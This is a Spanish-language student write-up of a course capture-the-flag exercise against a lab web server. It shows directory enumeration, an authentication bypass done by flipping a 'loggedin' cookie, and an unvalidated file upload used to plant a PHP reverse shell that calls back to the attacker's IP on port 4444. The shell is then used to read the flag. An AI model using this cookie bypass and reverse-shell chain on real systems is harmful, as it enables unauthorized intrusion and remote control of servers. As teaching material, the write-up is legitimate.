# Writeup P2 Tarea 2

**Nombre**: Valentina Rojas Osorio

**Equipo**: Hack Pals

# Desarrollo 

 _Para la solución de este problema, se está obviando la **instalación** de herramientas vistas durante el curso, sin embargo, se especifica detalladamente cómo utilizarlas en cada paso. También se especifican usos e instalación de herramientas externas (no vistas)._
 
 _Además, se debe estar conectado a la VPN del CEC, para tener acceso al servidor 172.17.69.241_

---

 Comenzamos inspeccionando la página en blanco corroborando que efectivamente tiene cuerpo vacío.

1. Procedemos a buscar información sobre directorios a los que podamos acceder en el servidor (directorios con código de respuesta 200) con la herramienta [dirsearch](https://www.kali.org/tools/dirsearch/). Una vez completada la instalación, abrimos una consola en linux y ejecutamos
    ```
    $ dirsearch -u 172.17.69.241:8082
    ```

1. Encontramos los siguientes directorios:
    ```
    200  0B  /index.php
    200  0B  /index.php/login/
    200 13B  /upload.php
    301 323B /uploads
    ```
    
    Tenemos 3 directorios con response code 200, donde 2 de ellos parecen carecer de contenido al pesar 0 Bytes. Además, encontramos uno con response code 300 que nos indica que podríamos acceder a él si tuvieramos permisos.


1. Por lo tanto, ingresamos primero por intuición al directorio /upload.php. La página nos muestra el mensaje "Not logged in" lo que nos dice que al _loggearnos_ podríamos encontrar información.

1. Al inspeccionar la página _(172.17.69.241:8082/upload.php)_, encontramos en la pestaña _Storage_ una cookie de nombre _loggedin_ con valor 0, por lo tanto le cambiaremos el parámetro _value_ entregandole valor 1 y recargamos la página.

1. Al recargar, nos aparece un _form_ con un input de tipo _file_ y un botón de tipo _submit_. Aunque la página nos dice que subamos una imagen, intentamos subir un archivo de cualquier otra extensión (por ejemplo archivo.ext) y con éxito la página nos dice "The file has been uploaded to uploads/archivo.ext"

## Reverse Shell.
 
Aprovechando esta vulnerabilidad del formulario (no tener validador), procedemos atacando con con la técnica reverse shell como sigue:

1. Creamos un archivo php y copiamos [este código](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) en nuestro archivo. 

1. Editamos las líneas 49 y 50 del código, (las variables ip y port de la función set_time_limit() respectivamente) al estar conectados a la VPN del CEC nuestra IP es la VPN IP que se encuentra en la parte superior derecha de la barra de tareas de Kali. El puerto puede ser cualquier que no estemos usando. En mi caso, mi VPN IP es 10.41.0.34 y ocuparé el puerto 4444 para escuchar, de esta manera, la función de mi archivo php queda
    ```php
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '10.41.0.34';  // CHANGE THIS
    $port = 4444;       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;
    ```
    * _Como recomendación personal, sugiero poner un nombre distintivo al archivo.php ya que puede ser sobreescrito por otro compañero con otra ip y otro puerto._

    Finalmente, subimos el archivo php al _form_, en mi caso el archivo "rilakkuma.php"
1. Ahora tendremos acceso a los directorios del servidor desde nuestra consola con la herramienta [pwncat](https://pwncat.readthedocs.io/en/latest/usage.html) podremos ver la información que está escuchando nuestro puerto. Para esto, abrimos una consola e ingresamos el comando
    ```
    $ pwncat --listen 4444
    ```
    $ Abrimos otra consola y ejecutamos
    ```
    $ curl 172.17.69.241:8082/uploads/rilakkuma.php
    ```
    Luego, volvemos a la consola donde ejecutamos pwncat y si el enlace fue exitoso en consola nos saldrá información como por ejemplo en qué maquina está corriendo el sv, versiones, etc.

1. Luego, al ejecutar los comandos
    ```
    $ cd
    $ ls
    ```
    Se mostrarán en consola varios directorios de la máquina que está hosteando el sv, ejecutamos los siguientes comandos para ir al directorio que contiene la flag
    ```
    $ cd var
    $ cd www
    $ cd html
    ```
1. En este directorio (html) tendremos la información de la pagina del servidor, para ver en consola los archivos/directorios incluidos los directorios secretos ejecutamos
    ```
    $ ls -a
    ```
    y se nos desplegará en consola los directorios
    ```
    .
    ..
    .secret-dir
    index.php
    upload.php
    uploads
    ```
1. Finalmente, como el directorio .secret.dir es el más sospechoso, accedemos al directorio, encontramos el archivo flag.txt y lo visualizamos en consola con el comando cat
    ```
    $ cd .secret-dir
    $ ls
    flag.txt
    $ cat flag.txt
    CC5325{RCEFlag}
    ```

# Resultados
La flag de este problema es 

        CC5325{RCEFlag}
    